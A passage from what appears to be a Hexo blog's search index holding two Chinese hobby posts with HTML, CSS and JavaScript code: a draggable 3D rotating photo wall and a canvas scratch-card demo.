class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 层叠样式表 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="comment">/* 去掉默认效果 */</span></span></span><br><span class="line"><span class="language-css">            *&#123;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-tag">body</span>&#123;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">background</span>: <span class="number">#222</span>;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="language-css">                  <span class="comment">/* 取消选中 */</span></span></span><br><span class="line"><span class="language-css">                  user-select: none;  </span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.perspective</span>&#123;</span></span><br><span class="line"><span class="language-css">                  <span class="comment">/*子元素透视 场景深度*/</span></span></span><br><span class="line"><span class="language-css">                  <span class="attribute">perspective</span>: <span class="number">800px</span>;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.wrap</span>&#123;</span></span><br><span class="line"><span class="language-css">                  <span class="comment">/* 3d */</span></span></span><br><span class="line"><span class="language-css">                  <span class="attribute">width</span>: <span class="number">135px</span>;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">height</span>: <span class="number">240px</span>;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">margin</span>: <span class="number">100px</span> auto;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">                  <span class="comment">/* border: 1px solid red; */</span></span></span><br><span class="line"><span class="language-css">                  <span class="attribute">transform</span>: <span class="built_in">rotateX</span>(-<span class="number">20deg</span>) <span class="built_in">rotateY</span>(<span class="number">0deg</span>);</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">transform-style</span>: preserve-<span class="number">3</span>d;</span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.wrap</span> <span class="selector-tag">img</span>&#123;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">                  <span class="comment">/* 绝对定位 */</span></span></span><br><span class="line"><span class="language-css">                  <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">transform</span>: <span class="built_in">rotateY</span>(<span class="number">0deg</span>) <span class="built_in">translateZ</span>(<span class="number">0px</span>);</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">background</span>: transparent;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">4px</span> <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">                  <span class="comment">/* webkit */</span></span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">            <span class="comment">/* 照片底座 */</span></span></span><br><span class="line"><span class="language-css">            <span class="selector-class">.wrap</span> <span class="selector-tag">p</span>&#123;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">width</span>: <span class="number">1200px</span>;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">height</span>: <span class="number">1200px</span>;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">background</span>: <span class="built_in">-webkit-radial-gradient</span>(center center,<span class="number">600px</span> <span class="number">600px</span>, <span class="built_in">rgba</span>(<span class="number">122</span>,<span class="number">122</span>,<span class="number">122</span>,.<span class="number">5</span>), <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>));</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">left</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">top</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">margin-left</span>: -<span class="number">600px</span>;</span></span><br><span class="line"><span class="language-css">                  <span class="attribute">margin-top</span>:-<span class="number">600px</span>;</span></span><br><span class="line"><span class="language-css">                  <span class="comment">/* 沿着x轴按倒 */</span></span></span><br><span class="line"><span class="language-css">                  <span class="attribute">transform</span>: <span class="built_in">rotateX</span>(<span class="number">90deg</span>);</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">            &#125;</span></span><br><span class="line"><span class="language-css">      </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- 盒子容器 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;perspective&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wrap&quot;</span> <span class="attr">id</span>=<span class="string">&quot;imgwrap&quot;</span>&gt;</span></span><br><span class="line">                  <span class="comment">&lt;!-- 引入图片值页面 --&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://img.jj20.com/up/allimg/mn02/11291Z15G0/19112Z15G0-5-lp.jpg&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img.pconline.com.cn/images/upload/upc/tx/itbbs/1402/11/c11/31155621_1392091333158_mthumb.jpg&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://img.jj20.com/up/allimg/mn01/032919111325/1Z329111325-8-lp.jpg&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://img.jj20.com/up/allimg/mn01/032919111325/1Z329111325-6-lp.jpg&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://5b0988e595225.cdn.sohucs.com/images/20190711/468d571154f44b09ae1bec04e7aaddd6.jpeg&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img0.baidu.com/it/u=1942490343,1563850341&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img1.baidu.com/it/u=1506767484,4118036827&amp;fm=26&amp;fmt=auto&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img0.baidu.com/it/u=1954230418,1537620189&amp;fm=26&amp;fmt=auto&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img2.baidu.com/it/u=2350168550,4051829482&amp;fm=26&amp;fmt=auto&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img1.baidu.com/it/u=3271372631,984040662&amp;fm=26&amp;fmt=auto&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img1.baidu.com/it/u=2513572093,379515820&amp;fm=26&amp;fmt=auto&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img0.baidu.com/it/u=558373117,3320187720&amp;fm=26&amp;fmt=auto&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img0.baidu.com/it/u=3571760650,3610567496&amp;fm=26&amp;fmt=auto&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img2.baidu.com/it/u=1624847876,840515385&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=500&amp;h=667&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://img2.baidu.com/it/u=767089391,1867380875&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=576&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--  src=&quot;JS/photo.js&quot; --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> oImg=<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;img&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> len=oImg.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(len)</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> deg=<span class="number">360</span>/len;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> oWrap=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;imgwrap&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// var oWrap=document.querySelector(&#x27;.wrap&#x27;);</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//页面加载完毕在执行的代码</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                  <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">forEach</span>.<span class="title function_">call</span>(oImg,<span class="keyword">function</span>(<span class="params">ele,index,self</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="comment">// 旋转并沿Z轴平移</span></span></span><br><span class="line"><span class="language-javascript">                  ele.<span class="property">style</span>.<span class="property">transform</span>=<span class="string">&quot;rotateY(&quot;</span>+deg*index+<span class="string">&quot;deg) translateZ(350px)&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                  <span class="comment">//过渡时间1s</span></span></span><br><span class="line"><span class="language-javascript">                 ele.<span class="property">style</span>.<span class="property">transition</span>=<span class="string">&quot;1s &quot;</span>+(len-index)*<span class="number">0.1</span>+<span class="string">&quot;s&quot;</span>;   </span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//翻动3D相册</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> newX,newY,lastX,lastY,minusX,minusY,rotX=-<span class="number">20</span>,rotY=<span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="property">onmousedown</span>=<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                  <span class="comment">// 点击设置初值</span></span></span><br><span class="line"><span class="language-javascript">                  lastX=e.<span class="property">clientX</span>;</span></span><br><span class="line"><span class="language-javascript">                  lastY=e.<span class="property">clientY</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                  <span class="variable language_">this</span>.<span class="property">onmousemove</span>=<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                        newX=e.<span class="property">clientX</span>;</span></span><br><span class="line"><span class="language-javascript">                        newY=e.<span class="property">clientY</span>;</span></span><br><span class="line"><span class="language-javascript">                        minusX=newX-lastX;</span></span><br><span class="line"><span class="language-javascript">                        minusY=newY-lastY;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                        rotX-=minusY*<span class="number">0.2</span>;</span></span><br><span class="line"><span class="language-javascript">                        rotY+=minusX*<span class="number">0.1</span>;</span></span><br><span class="line"><span class="language-javascript">                        oWrap.<span class="property">style</span>.<span class="property">transform</span>=<span class="string">&quot;rotateX(&quot;</span>+rotX+<span class="string">&quot;deg) rotateY(&quot;</span>+rotY+<span class="string">&quot;deg)&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">                        lastX=newX;</span></span><br><span class="line"><span class="language-javascript">                        lastY=newY;</span></span><br><span class="line"><span class="language-javascript">                        </span></span><br><span class="line"><span class="language-javascript">                  &#125;</span></span><br><span class="line"><span class="language-javascript">                  <span class="variable language_">this</span>.<span class="property">onmouseup</span>=<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="comment">//鼠标松开</span></span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">this</span>.<span class="property">onmousemove</span>=<span class="literal">null</span>;<span class="comment">//清除鼠标移动</span></span></span><br><span class="line"><span class="language-javascript">                  &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上效果图</p><p><img src="/2021/09/21/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/3d%E6%97%8B%E8%BD%AC%E7%85%A7%E7%89%87%E5%A2%99.gif"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 娱乐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刮刮乐</title>
      <link href="/2021/09/21/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2-%E5%88%AE%E5%88%AE%E4%B9%90/"/>
      <url>/2021/09/21/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2-%E5%88%AE%E5%88%AE%E4%B9%90/</url>
      
        <content type="html"><![CDATA[<hr><p>这是我的第一篇博客，闲来无事写一个刮刮乐</p><span id="more"></span><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>刮刮乐<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#c1</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">border</span>: <span class="number">1px</span> solid blue;</span></span><br><span class="line"><span class="language-css"><span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#c2</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">border</span>: <span class="number">1px</span> solid red;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">body</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;c1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;960&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1440&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;c2&quot;</span> <span class="attr">width</span>=<span class="string">&quot;960&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1440&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> c1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;c1&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> c2 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;c2&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> ctx1 = c1.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> ctx2 = c2.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 绘制图片到底层  canvas2</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> imgs = <span class="keyword">new</span> <span class="title class_">Image</span>();</span></span><br><span class="line"><span class="language-javascript">imgs.<span class="property">src</span> = <span class="string">&#x27;要刮得图片路径&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">imgs.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">ctx2.<span class="title function_">drawImage</span>(<span class="variable language_">this</span>,<span class="number">0</span>,<span class="number">0</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 涂层绘制到顶层(即覆盖膜)  canvas1</span></span></span><br><span class="line"><span class="language-javascript">ctx1.<span class="property">fillStyle</span> = <span class="string">&quot;lightgray&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">ctx1.<span class="title function_">fillRect</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">960</span>,<span class="number">1440</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">ctx1.<span class="property">font</span> = <span class="string">&quot;normal 80px 仿宋&quot;</span>;   </span></span><br><span class="line"><span class="language-javascript">ctx1.<span class="property">strokeStyle</span> = <span class="string">&quot;slateblue&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">ctx1.<span class="title function_">strokeText</span>(<span class="string">&quot;请刮开！&quot;</span>,<span class="number">320</span>,<span class="number">750</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 监听canvas的onmousedown事件</span></span></span><br><span class="line"><span class="language-javascript">c1.<span class="property">onmousedown</span> = <span class="keyword">function</span>(<span class="params">ev</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">c1.<span class="property">onmousemove</span> = <span class="keyword">function</span>(<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> w = <span class="number">50</span>;<span class="comment">// 清除区域的宽度</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> h = <span class="number">50</span>;<span class="comment">// 清除区域的高度</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x = e.<span class="property">pageX</span>-c1.<span class="property">offsetLeft</span> - w/<span class="number">2</span>;    <span class="comment">// 清除区域的x位置</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> y = e.<span class="property">pageY</span>-c1.<span class="property">offsetTop</span> - h/<span class="number">2</span>;<span class="comment">// 清除区域的y位置</span></span></span><br><span class="line"><span class="language-javascript">ctx1.<span class="title function_">clearRect</span>(x,y,w,h);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">c1.<span class="property">onmouseup</span> = <span class="keyword">function</span>(<span class="params">ev</span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 取消onmousemove事件</span></span></span><br><span class="line"><span class="language-javascript">c1.<span class="property">onmousemove</span> = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在路径里放上你女朋友的照片，什么你没有女朋友，那你就放上你女神的照片跟她表白，让她成为你女朋友不就行了吗！！！！</p><p>放上效果图</p><p><img src="/2021/09/21/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2-%E5%88%AE%E5%88%AE%E4%B9%90/%E5%88%AE%E5%88%AE%E4%B9%90.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 娱乐 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
